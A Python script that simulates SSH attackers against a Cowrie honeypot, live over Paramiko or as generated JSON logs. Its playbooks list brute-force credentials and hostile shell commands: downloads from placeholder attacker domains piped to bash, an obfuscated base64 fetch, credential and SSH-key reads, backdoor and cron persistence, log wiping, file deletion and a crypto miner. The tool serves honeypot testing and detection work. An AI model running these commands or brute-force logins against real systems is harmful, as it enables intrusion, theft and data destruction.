#!/usr/bin/env python3
"""Honeypot attack simulator — realistic interactive SSH attacker + offline JSON generator.

Uses Paramiko to open a proper TTY channel against the Cowrie honeypot,
sending commands with human-like delays. Also supports offline generation
of safe Cowrie-style JSON events for reliable demos.

Usage:
    # Live interactive simulation
    python3 scripts/attack-simulator.py --host 192.168.1.79 --sessions 10
    python3 scripts/attack-simulator.py --host 192.168.1.79 --scenario full-chain

    # Offline JSON generation (no SSH connection)
    python3 scripts/attack-simulator.py --scenario full-chain --offline-output data/raw/cowrie/log/cowrie.json --count 1

    # Named scenarios
    python3 scripts/attack-simulator.py --scenario cryptomining --offline-output /tmp/cowrie.json
"""

from __future__ import annotations

import argparse
import json
import random
import socket
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

# paramiko is imported lazily inside run_attack_session — offline mode does not need it.

# ── Documentation-safe ranges and domains ────────────────────────────────

_SAFE_IPS = [
    "192.0.2.{n}" for n in range(1, 255)
] + [
    "198.51.100.{n}" for n in range(1, 255)
] + [
    "203.0.113.{n}" for n in range(1, 255)
]

_SAFE_DOMAINS = [
    "bad.example.com",
    "evil.example.com",
    "dropper.example.com",
    "paste.example.com",
    "pool.example.com",
    "c2.example.com",
    "malware.example.net",
]

# ── Credential lists (real-world brute force patterns) ──────────────────

BRUTE_FORCE_CREDS: list[tuple[str, str]] = [
    ("root", "root"),
    ("root", "admin"),
    ("root", "123456"),
    ("root", "password"),
    ("root", "toor"),
    ("root", "raspberry"),
    ("root", "12345678"),
    ("root", "qwerty"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("ubuntu", "ubuntu"),
    ("ubuntu", "123456"),
    ("pi", "raspberry"),
    ("pi", "raspberrypi"),
    ("test", "test"),
    ("user", "123456"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
    ("git", "git"),
    ("debian", "debian"),
    ("guest", "guest"),
    ("ftpuser", "ftpuser"),
    ("mysql", "mysql"),
    ("tomcat", "tomcat"),
    ("nagios", "nagios"),
    ("support", "support"),
]

# ── Attack playbooks ────────────────────────────────────────────────────

# Each playbook is a list of (command, min_delay, max_delay) tuples.
# Delays simulate human typing/reading between commands.

RECON_PLAYBOOK: list[tuple[str, float, float]] = [
    ("whoami", 0.3, 0.8),
    ("id", 0.2, 0.5),
    ("uname -a", 0.3, 0.7),
    ("hostname", 0.2, 0.4),
    ("cat /proc/cpuinfo 2>/dev/null | head -5", 0.5, 1.2),
    ("free -m", 0.3, 0.6),
    ("df -h", 0.3, 0.6),
    ("ifconfig 2>/dev/null || ip addr", 0.5, 1.0),
    ("netstat -tulpn 2>/dev/null || ss -tulpn", 0.5, 1.0),
    ("ps aux 2>/dev/null | head -10", 0.4, 0.8),
    ("ls -la /home", 0.3, 0.6),
    ("cat /etc/passwd", 0.3, 0.6),
    ("cat /etc/shadow 2>/dev/null", 0.3, 0.5),
    ("last 2>/dev/null | head -5", 0.3, 0.6),
    ("w", 0.2, 0.5),
]

DOWNLOAD_PLAYBOOK: list[tuple[str, float, float]] = [
    ("wget http://{domain}/payload.sh -O /tmp/payload.sh", 1.0, 2.0),
    ("curl -s http://{domain}/backdoor.py -o /tmp/.backdoor.py", 1.0, 2.5),
    ("wget http://{domain}/miner.tar.gz -O /tmp/.miner.tar.gz", 1.0, 2.0),
    ("curl -s http://{domain}/scanner.sh 2>/dev/null | bash", 1.0, 2.5),
    ("wget http://{domain}/r/abc123 -O /tmp/setup.sh", 1.0, 2.0),
]

PERSISTENCE_PLAYBOOK: list[tuple[str, float, float]] = [
    ("chmod +x /tmp/payload.sh", 0.3, 0.6),
    ("echo '*/5 * * * * /tmp/.backdoor.py' | crontab - 2>/dev/null", 0.8, 1.5),
    ("echo 'ssh-rsa AAAAB3NzaC...attacker@kali' >> ~/.ssh/authorized_keys 2>/dev/null", 0.5, 1.0),
    ("nohup /tmp/payload.sh >/dev/null 2>&1 &", 0.5, 1.0),
    ("systemctl enable sshd 2>/dev/null", 0.3, 0.7),
]

PRIVESC_PLAYBOOK: list[tuple[str, float, float]] = [
    ("sudo -l 2>/dev/null", 0.3, 0.7),
    ("find / -perm -4000 -type f 2>/dev/null | head -10", 0.6, 1.2),
    ("cat /etc/crontab 2>/dev/null", 0.3, 0.6),
    ("ls -la /etc/sudoers.d/ 2>/dev/null", 0.3, 0.5),
    ("cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'", 0.4, 0.8),
    ("getcap -r / 2>/dev/null | head -5", 0.5, 1.0),
    ("pkexec --version 2>/dev/null", 0.2, 0.4),
]

CREDENTIAL_ACCESS_PLAYBOOK: list[tuple[str, float, float]] = [
    ("cat /etc/shadow 2>/dev/null | head -5", 0.3, 0.7),
    ("cat ~/.ssh/id_rsa 2>/dev/null", 0.3, 0.5),
    ("ls -la ~/.ssh/ 2>/dev/null", 0.2, 0.4),
    ("cat ~/.bash_history 2>/dev/null | tail -20", 0.3, 0.6),
    ("grep -r password /etc/ 2>/dev/null | head -10", 0.5, 1.0),
    ("find / -name '*.key' -type f 2>/dev/null | head -5", 0.5, 1.0),
    ("cat ~/.aws/credentials 2>/dev/null", 0.2, 0.5),
]

CRYPTOMINING_PLAYBOOK: list[tuple[str, float, float]] = [
    ("wget http://{domain}/xmrig.tar.gz -O /tmp/.x.tar.gz", 1.0, 2.0),
    ("tar xzf /tmp/.x.tar.gz -C /tmp/ 2>/dev/null", 0.5, 1.0),
    ("chmod +x /tmp/xmrig", 0.2, 0.4),
    ("/tmp/xmrig --url=pool.{domain}:4444 --algo=rx/0 --user=4AbCDeFg12345garbage --pass=x --tls 2>/dev/null &", 1.0, 2.0),
    ("curl -s http://{domain}/config.json -o /tmp/.cfg.json 2>/dev/null", 0.8, 1.5),
    ("nohup /tmp/xmrig -c /tmp/.cfg.json >/dev/null 2>&1 &", 0.5, 1.0),
]

OBFUSCATION_PLAYBOOK: list[tuple[str, float, float]] = [
    ("echo 'd2hvYW1p' | base64 -d", 0.3, 0.6),
    ("echo 'aWQK' | base64 -d | sh", 0.3, 0.6),
    ("sh -c 'echo dW5hbWUgLWEK | base64 -d | sh'", 0.4, 0.8),
    ("eval $(echo 'd2dldCBodHRwOi8vZHJvcHBlci5leGFtcGxlLmNvbS9wYXlsb2FkLnNoIC1PIC90bXAvLnAuc2gK' | base64 -d)", 0.5, 1.0),
    ("/dev/tcp/{ip}/4444 2>/dev/null", 0.3, 0.6),
]

DEFENSE_EVASION_PLAYBOOK: list[tuple[str, float, float]] = [
    ("cat /dev/null > /var/log/auth.log 2>/dev/null", 0.3, 0.6),
    ("> /var/log/wtmp 2>/dev/null", 0.2, 0.4),
    ("history -c", 0.1, 0.3),
    ("unset HISTFILE", 0.1, 0.3),
    ("cat /dev/null > ~/.bash_history 2>/dev/null", 0.2, 0.4),
    ("systemctl stop rsyslog 2>/dev/null", 0.3, 0.6),
    ("rm -rf /tmp/.* 2>/dev/null", 0.3, 0.5),
    ("truncate -s 0 /var/log/syslog 2>/dev/null", 0.2, 0.4),
]

DESTRUCTIVE_PLAYBOOK: list[tuple[str, float, float]] = [
    ("rm -rf /var/log/*.log 2>/dev/null", 0.3, 0.6),
    ("rm -rf /tmp/* 2>/dev/null", 0.3, 0.6),
    ("cat /dev/urandom > /dev/null 2>/dev/null &", 0.2, 0.4),
    ("dd if=/dev/zero of=/tmp/.wipe bs=1M count=10 2>/dev/null", 0.5, 1.0),
    ("fdisk -l /dev/sda 2>/dev/null", 0.3, 0.5),
]


# ── Scenario registry ───────────────────────────────────────────────────

SCENARIO_PLAYBOOKS: dict[str, list[tuple[str, float, float]]] = {
    "brute-force": [],  # login-only, no post-login commands
    "recon": RECON_PLAYBOOK,
    "payload-download": DOWNLOAD_PLAYBOOK,
    "persistence": PERSISTENCE_PLAYBOOK,
    "privilege-escalation": PRIVESC_PLAYBOOK,
    "credential-access": CREDENTIAL_ACCESS_PLAYBOOK,
    "cryptomining": CRYPTOMINING_PLAYBOOK,
    "obfuscation": OBFUSCATION_PLAYBOOK,
    "defense-evasion": DEFENSE_EVASION_PLAYBOOK,
    "destructive-action": DESTRUCTIVE_PLAYBOOK,
}

# Full-chain ordering matters — recon first, then escalation/credential, then impact.
# Each tuple is (label, playbook, guaranteed_trigger_index).
# The guaranteed trigger is a command that reliably classifies as that category
# (e.g. avoids wget/curl/chmod/nohup which get caught by other categories first).
_FULL_CHAIN_PLAYBOOKS: list[tuple[str, list[tuple[str, float, float]], int]] = [
    ("recon", RECON_PLAYBOOK, 0),                    # whoami
    ("credential-access", CREDENTIAL_ACCESS_PLAYBOOK, 0),  # cat /etc/shadow
    ("privilege-escalation", PRIVESC_PLAYBOOK, 0),    # sudo -l
    ("payload-download", DOWNLOAD_PLAYBOOK, 0),       # wget payload.sh
    ("cryptomining", CRYPTOMINING_PLAYBOOK, 3),       # /tmp/xmrig --url=... (no wget/curl prefix)
    ("persistence", PERSISTENCE_PLAYBOOK, 2),          # authorized_keys write
    ("obfuscation", OBFUSCATION_PLAYBOOK, 0),         # echo ... | base64 -d
    ("defense-evasion", DEFENSE_EVASION_PLAYBOOK, 2),  # history -c
    ("destructive-action", DESTRUCTIVE_PLAYBOOK, 1),   # rm -rf /tmp/*
]


# ── Offline JSON generator ──────────────────────────────────────────────

def _safe_domain() -> str:
    return random.choice(_SAFE_DOMAINS)


def _safe_ip() -> str:
    template = random.choice(_SAFE_IPS)
    return template.format(n=random.randint(1, 254))


def _format_cmd(cmd: str, ip: str, domain: str) -> str:
    """Fill in safe placeholders in command templates."""
    return cmd.format(ip=ip, domain=domain)


def generate_offline_scenario(
    scenario: str,
    output_path: str,
    count: int = 1,
    source_ip: str | None = None,
    session_prefix: str | None = None,
) -> int:
    """Generate safe Cowrie-style JSON lines without any SSH connections.

    Returns the number of JSON events written.
    """
    if scenario not in SCENARIO_PLAYBOOKS and scenario != "full-chain":
        print(f"Unknown scenario: {scenario}", file=sys.stderr)
        return 0

    events: list[dict[str, Any]] = []
    now = datetime.now(timezone.utc)
    prefix = session_prefix or "offline"
    event_count = 0

    for session_num in range(count):
        ip = source_ip or _safe_ip()
        domain = _safe_domain()
        session_id = f"{prefix}-{session_num:04d}"
        username, password = random.choice(BRUTE_FORCE_CREDS)
        t = now + timedelta(seconds=session_num * 30)

        # Session connect
        events.append({
            "eventid": "cowrie.session.connect",
            "timestamp": t.isoformat(),
            "src_ip": ip,
            "session": session_id,
            "protocol": "ssh",
        })
        event_count += 1
        t += timedelta(seconds=2)

        # Login attempts (1-3 failed, then success)
        for attempt in range(random.randint(1, 3)):
            fake_user, fake_pass = random.choice(BRUTE_FORCE_CREDS)
            events.append({
                "eventid": "cowrie.login.failed",
                "timestamp": t.isoformat(),
                "src_ip": ip,
                "session": session_id,
                "protocol": "ssh",
                "username": fake_user,
                "password": fake_pass,
            })
            event_count += 1
            t += timedelta(seconds=random.randint(2, 5))

        # Successful login
        events.append({
            "eventid": "cowrie.login.success",
            "timestamp": t.isoformat(),
            "src_ip": ip,
            "session": session_id,
            "protocol": "ssh",
            "username": username,
            "password": password,
        })
        event_count += 1
        t += timedelta(seconds=3)

        # Playbook commands
        commands: list[tuple[str, float, float]] = []

        if scenario == "full-chain":
            for _label, playbook, trigger_idx in _FULL_CHAIN_PLAYBOOKS:
                # Always include the guaranteed trigger command
                guaranteed = playbook[trigger_idx]
                commands.append(guaranteed)
                # Add random extras from remaining commands
                rest = [cmd for i, cmd in enumerate(playbook) if i != trigger_idx]
                extra_count = max(0, len(playbook) // 2 - 1)
                if rest and extra_count > 0:
                    commands.extend(random.sample(rest, min(extra_count, len(rest))))
        else:
            playbook = SCENARIO_PLAYBOOKS.get(scenario, [])
            commands = list(playbook)

        for cmd_template, _min_delay, _max_delay in commands:
            cmd = _format_cmd(cmd_template, ip, domain)
            events.append({
                "eventid": "cowrie.command.input",
                "timestamp": t.isoformat(),
                "src_ip": ip,
                "session": session_id,
                "protocol": "ssh",
                "input": cmd,
            })
            event_count += 1
            t += timedelta(seconds=random.randint(2, 8))

        # Session closed
        events.append({
            "eventid": "cowrie.session.closed",
            "timestamp": t.isoformat(),
            "src_ip": ip,
            "session": session_id,
            "protocol": "ssh",
        })
        event_count += 1

    # Write to file
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "a") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    return event_count


# ── Session runner ──────────────────────────────────────────────────────


def _human_delay(min_s: float, max_s: float) -> None:
    time.sleep(random.uniform(min_s, max_s))


def run_attack_session(
    host: str,
    port: int,
    username: str,
    password: str,
    playbook: list[tuple[str, float, float]],
    connect_timeout: int = 10,
) -> bool:
    """Open an interactive SSH session and run a playbook with delays.

    Returns True if authentication succeeded (even if commands later fail).
    """
    import paramiko  # lazy import — offline mode does not need SSH

    ip = host
    domain = _safe_domain()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=connect_timeout,
        )
    except paramiko.AuthenticationException:
        print(f"  [-] {username}:{password} — AUTH FAILED")
        return False
    except (socket.error, paramiko.SSHException, OSError) as exc:
        print(f"  [!] {username}:{password} — CONNECTION ERROR: {exc}")
        return False

    # Open an interactive shell channel (PTY — Cowrie captures this)
    try:
        channel = client.invoke_shell(width=120, height=40)
        _human_delay(0.5, 1.0)

        # Drain the initial banner/motd
        if channel.recv_ready():
            channel.recv(4096)

        for cmd_template, min_delay, max_delay in playbook:
            cmd = _format_cmd(cmd_template, ip, domain)
            channel.send((cmd + "\n").encode("utf-8"))
            _human_delay(min_delay, max_delay)

            # Wait for output to settle
            settle = 0
            while settle < 3:
                if channel.recv_ready():
                    channel.recv(4096)
                    settle = 0
                else:
                    _human_delay(0.1, 0.3)
                    settle += 1

        # Clean exit
        channel.send(b"exit\n")
        _human_delay(0.2, 0.5)
        channel.close()

    except (socket.error, paramiko.SSHException, OSError) as exc:
        print(f"  [!] {username}:{password} — SESSION ERROR: {exc}")
    finally:
        client.close()

    print(f"  [+] {username}:{password} — OK ({len(playbook)} commands)")
    return True


def build_playbook(
    playbook_type: str,
    scenario: str,
) -> list[tuple[str, float, float]]:
    """Assemble a realistic command chain based on attack type or scenario."""
    cmds: list[tuple[str, float, float]] = []

    if scenario == "brute-force" or playbook_type == "brute":
        return [("exit", 0.1, 0.3)]

    if scenario != "full" and scenario != "full-chain":
        # Named scenario — return its playbook directly
        playbook = SCENARIO_PLAYBOOKS.get(scenario)
        if playbook:
            return list(playbook)
        return [("exit", 0.1, 0.3)]

    # Legacy "full" mode — random selection
    if playbook_type == "full":
        # Recon first
        cmds.extend(random.sample(RECON_PLAYBOOK, min(5, len(RECON_PLAYBOOK))))
        # Sometimes download
        if random.random() < 0.5:
            cmds.extend(random.sample(DOWNLOAD_PLAYBOOK, 1))
        # Sometimes persistence
        if random.random() < 0.25:
            cmds.extend(random.sample(PERSISTENCE_PLAYBOOK, 1))
        # Sometimes privesc
        if random.random() < 0.2:
            cmds.extend(random.sample(PRIVESC_PLAYBOOK, 1))
        cmds.append(("exit", 0.1, 0.3))
        return cmds

    # "full-chain" live — staged attack with guaranteed trigger per category
    if scenario == "full-chain":
        for _label, playbook, trigger_idx in _FULL_CHAIN_PLAYBOOKS:
            # Always include the guaranteed trigger command
            cmds.append(playbook[trigger_idx])
            # Add random extras from remaining commands
            rest = [cmd for i, cmd in enumerate(playbook) if i != trigger_idx]
            extra_count = max(0, len(playbook) // 2 - 1)
            if rest and extra_count > 0:
                cmds.extend(random.sample(rest, min(extra_count, len(rest))))
        cmds.append(("exit", 0.1, 0.3))
        return cmds

    return [("exit", 0.1, 0.3)]


# ── CLI ─────────────────────────────────────────────────────────────────


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Realistic honeypot attack simulator (Paramiko interactive SSH + offline JSON)."
    )
    parser.add_argument(
        "--host", default="192.168.1.79",
        help="Honeypot host (default: 192.168.1.79)",
    )
    parser.add_argument(
        "--port", type=int, default=2222,
        help="Honeypot SSH port (default: 2222)",
    )
    parser.add_argument(
        "--sessions", type=int, default=10,
        help="Number of attack sessions (default: 10)",
    )
    parser.add_argument(
        "--delay", type=float, default=3.0,
        help="Delay between sessions in seconds (default: 3.0)",
    )
    parser.add_argument(
        "--brute-only", action="store_true",
        help="Only brute force login attempts, no post-login commands",
    )
    parser.add_argument(
        "--aggressive", action="store_true",
        help="More commands per session, shorter inter-session delays",
    )
    parser.add_argument(
        "--timeout", type=int, default=10,
        help="Connection timeout per session (default: 10s)",
    )
    parser.add_argument(
        "--scenario",
        choices=[
            "brute-force", "recon", "payload-download", "persistence",
            "privilege-escalation", "credential-access", "cryptomining",
            "obfuscation", "defense-evasion", "destructive-action",
            "full-chain",
        ],
        default=None,
        help="Named attack scenario (overrides --brute-only and default random playbook)",
    )
    parser.add_argument(
        "--offline-output",
        default=None,
        metavar="PATH",
        help="Generate Cowrie JSON lines to PATH (no SSH connections, safe-only)",
    )
    parser.add_argument(
        "--source-ip",
        default=None,
        help="Source IP for offline generation (default: random safe IP)",
    )
    parser.add_argument(
        "--session-id-prefix",
        default=None,
        help="Prefix for session IDs in offline generation (default: 'offline')",
    )
    parser.add_argument(
        "--count", type=int, default=1,
        help="Number of sessions for offline generation (default: 1)",
    )
    parser.add_argument(
        "--allow-impactful-live",
        action="store_true",
        help=(
            "REQUIRED to run destructive-action or full-chain scenarios in live SSH mode. "
            "Without this flag, live mode blocks scenarios that could damage a real server."
        ),
    )
    args = parser.parse_args()

    # ── Offline mode ──
    if args.offline_output:
        scenario = args.scenario or "full-chain"
        print(f"\n{'='*60}")
        print("Honeypot Attack Simulator (Offline — Safe JSON Only)")
        print(f"Scenario: {scenario}")
        print(f"Output:   {args.offline_output}")
        print(f"Sessions: {args.count}")
        print(f"Source IP: {args.source_ip or 'random (safe range)'}")
        print(f"{'='*60}\n")

        written = generate_offline_scenario(
            scenario=scenario,
            output_path=args.offline_output,
            count=args.count,
            source_ip=args.source_ip,
            session_prefix=args.session_id_prefix,
        )
        print(f"\nDone. {written} events written to {args.offline_output} ({args.count} sessions).")
        return 0

    # ── Live Paramiko mode ──
    _IMPACTFUL_SCENARIOS = {"destructive-action", "full-chain"}
    scenario = args.scenario or ("brute" if args.brute_only else "full")

    if scenario in _IMPACTFUL_SCENARIOS and not args.allow_impactful_live:
        print(
            f"\nERROR: Live mode blocked for scenario '{scenario}'.\n"
            f"       This scenario sends commands (rm -rf, dd, fdisk, etc.) that could\n"
            f"       damage a real SSH server. Only use against a Cowrie honeypot.\n"
            f"       Add --allow-impactful-live if you are certain the target is safe.\n"
            f"       Or use --offline-output for safe JSON generation.\n",
            file=sys.stderr,
        )
        return 1

    playbook_type = "brute" if args.brute_only else "full"

    print(f"\n{'='*60}")
    print("Honeypot Attack Simulator (Paramiko — Interactive TTY)")
    print(f"Target: {args.host}:{args.port}")
    print(f"Plan: {args.sessions} sessions")
    if args.scenario:
        print(f"Scenario: {args.scenario}")
    print(f"{'='*60}\n")

    success = 0
    failed = 0

    for i in range(args.sessions):
        username, password = random.choice(BRUTE_FORCE_CREDS)

        if scenario == "brute" or scenario == "brute-force":
            playbook = build_playbook("brute", scenario)
            label = "BRUTE"
        else:
            playbook = build_playbook(playbook_type, scenario)
            cmd_count = len([c for c in playbook if c[0] != "exit"])
            label = f"{scenario.upper()} ({cmd_count} cmds)"

        print(f"[{i+1}/{args.sessions}] {label} — {username}:{password}")
        ok = run_attack_session(args.host, args.port, username, password, playbook, args.timeout)

        if ok:
            success += 1
        else:
            failed += 1

        if i < args.sessions - 1:
            d = args.delay * (0.3 if args.aggressive else 1.0)
            time.sleep(d)

    print(f"\n{'='*60}")
    print(f"Done. {success} sessions succeeded, {failed} failed.")
    print(f"Dashboard: http://{args.host}:5173/dashboard")
    print(f"{'='*60}\n")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
